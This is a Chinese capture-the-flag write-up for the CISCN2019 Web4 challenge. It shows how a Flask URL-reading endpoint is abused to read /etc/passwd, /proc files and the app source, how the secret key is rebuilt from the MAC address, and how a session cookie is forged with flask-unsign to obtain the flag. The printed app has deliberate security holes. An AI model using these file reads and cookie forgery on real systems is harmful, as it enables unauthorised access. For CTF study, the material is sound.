# \[CISCN2019 华东南赛区]Web4

## \[CISCN2019 华东南赛区]Web4

## 考点

* 文件包含
* uuid.getnode()
* flask cookie

## wp

题目链接是http://6fc4c3a4-c80d-4dc3-86bc-382a437489b9.node4.buuoj.cn:81/read?url=https://baidu.com

试试url=http://127.0.0.1没有反应，再试试url=/etc/passwd读取到了文件

访问url=/proc/self/environ，看到目录是/app

```
LANG=C.UTF-8SHELL=/bin/ashSHLVL=1WERKZEUG_RUN_MAIN=trueCHARSET=UTF-8PWD=/appWERKZEUG_SERVER_FD=3LOGNAME=glzjinUSER=glzjinHOME=/appPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binPS1=\h:\w\$ PAGER=less
```

再访问url=/proc/self/cmdline，看到路径为/usr/local/bin/python/app/app.py

再读取源码url=/app/app.py

```python
# encoding:utf-8
import re, random, uuid, urllib
from flask import Flask, session, request

app = Flask(__name__)
random.seed(uuid.getnode())
app.config['SECRET_KEY'] = str(random.random()*233)
app.debug = True

@app.route('/')
def index():
    session['username'] = 'www-data'
    return 'Hello World! <a href="/read?url=https://baidu.com">Read somethings</a>'

@app.route('/read')
def read():
    try:
        url = request.args.get('url')
        m = re.findall('^file.*', url, re.IGNORECASE)
        n = re.findall('flag', url, re.IGNORECASE)
        if m or n:
            return 'No Hack'
        res = urllib.urlopen(url)
        return res.read()
    except Exception as ex:
        print str(ex)
    return 'no response'

@app.route('/flag')
def flag():
    if session and session['username'] == 'fuck':
        return open('/flag.txt').read()
    else:
        return 'Access denied'

if __name__=='__main__':
    app.run(
        debug=True,
        host="0.0.0.0"
    )
```

可以看到用uuid.getnode()获取随机数，且开启了debug模式。

uuid.getnode()是返回当前主机网卡MAC地址的十进制形式

```python
>>> import  uuid
>>> uuid.getnode()
238300913255264
>>> s='D8-BB-C1-48-C3-60'.replace('-','')
>>> s
'D8BBC148C360'
>>> int(s,16)
238300913255264
```

Linux中记录MAC地址的文件是/sys/class/net/eth0/address或者 /etc/sysconfig/network-scripts/ifcfg-eth0

读到是`76:cd:87:f4:ab:4d` 对应的数值是130625121332045，然后在Python2中跑一下上面的代码，得到SECRET\_KEY为44.2045972134

先flask-unsign --decode --cookie解码得到cookie为{'username': b'www-data'}

再用`flask-unsign --sign --cookie "{'username': 'fuck'}" --secret '44.2045972134'` 加密即可

## 小结

1. uuid.getnode()是返回当前主机网卡MAC地址的十进制形式
2. Linux中记录MAC地址的文件是/sys/class/net/eth0/address或者 /etc/sysconfig/network-scripts/ifcfg-eth0
3. `?url=``https://baidu.com` 像这种也可以试试文件包含或者目录穿越
4. 文件包含可读/proc/self/environ和/proc/self/cmdline
